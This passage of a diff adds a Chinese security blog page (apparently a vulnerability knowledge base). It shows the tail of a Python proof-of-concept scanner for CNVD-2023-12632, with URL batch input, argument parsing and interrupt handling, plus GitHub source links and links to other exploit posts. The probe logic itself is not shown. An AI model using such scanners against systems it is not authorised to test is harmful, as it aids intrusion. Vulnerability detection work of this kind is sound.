class="hljs-keyword">as</span> file:<br>        url_list = file.read().strip().split(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><br>    <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> url_list:<br>        check_url(url, output)<br><br>        <span class="hljs-comment"># 捕获中断信号</span><br>        signal.signal(signal.SIGINT, handle_interrupt)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_interrupt</span>(<span class="hljs-params">signum, frame</span>):<br>    <span class="hljs-keyword">global</span> output_file<br><br>    <span class="hljs-comment"># 在捕获中断时保存当前扫描结果，并关闭文件</span><br>    <span class="hljs-keyword">if</span> output_file:<br>        output_file.close()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n扫描已中断并保存当前结果。&quot;</span>)<br>    exit()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> output_file<br><br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;CNVD-2023-12632检测POC&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-u&#x27;</span>, <span class="hljs-string">&#x27;--url&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;检测单个URL&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-r&#x27;</span>, <span class="hljs-string">&#x27;--file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;从文本中批量检测URL&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-o&#x27;</span>, <span class="hljs-string">&#x27;--output&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;将检测到的输出到文本中&#x27;</span>)<br>    args = parser.parse_args()<br><br>    <span class="hljs-keyword">if</span> args.output:<br>        output_file = <span class="hljs-built_in">open</span>(args.output, <span class="hljs-string">&#x27;a&#x27;</span>)  <span class="hljs-comment"># 以追加模式打开输出文件</span><br><br>    <span class="hljs-keyword">if</span> args.url:<br>        check_url(args.url, args.output)<br>    <span class="hljs-keyword">elif</span> args.file:<br>        check_urls_from_file(args.file, args.output)<br>    <span class="hljs-keyword">else</span>:<br>        parser.print_help()<br><br>    <span class="hljs-comment"># 注册捕获中断信号的处理程序</span><br>    signal.signal(signal.SIGINT, handle_interrupt)<br><br>    <span class="hljs-comment"># 关闭输出文件</span><br>    <span class="hljs-keyword">if</span> output_file:<br>        output_file.close()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    author_name = <span class="hljs-string">&quot;-----------------------------========================== SharpKean&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Author：&quot;</span>, author_name)<br>    main()<br></code></pre></td></tr></table></figure>
+
+<h2 id="脚本来源"><a href="#脚本来源" class="headerlink" title="脚本来源"></a>脚本来源</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/SharpKean/CNVD-2023-12632_POC">https://github.com/SharpKean/CNVD-2023-12632_POC</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ChinaRan0/3url">https://github.com/ChinaRan0/3url</a></li>
+</ul>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E5%BA%93/" class="category-chain-item">漏洞知识库</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/1970/01/01/POC/%E6%B3%9B%E5%BE%AEe-cology-v10%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="泛微e-cology-v10远程代码执行漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">泛微e-cology-v10远程代码执行漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/1970/01/01/POC/%E6%B3%9B%E5%BE%AEe-cology9%E6%8E%A5%E5%8F%A3WorkPlanService%E5%89%8D%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(XVE-2024-18112)/" title="泛微e-cology9接口WorkPlanService前台SQL注入漏洞(XVE-2024-18112)">
+                        <span class="hidden-mobile">泛微e-cology9接口WorkPlanService前台SQL注入漏洞(XVE-2024-18112)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
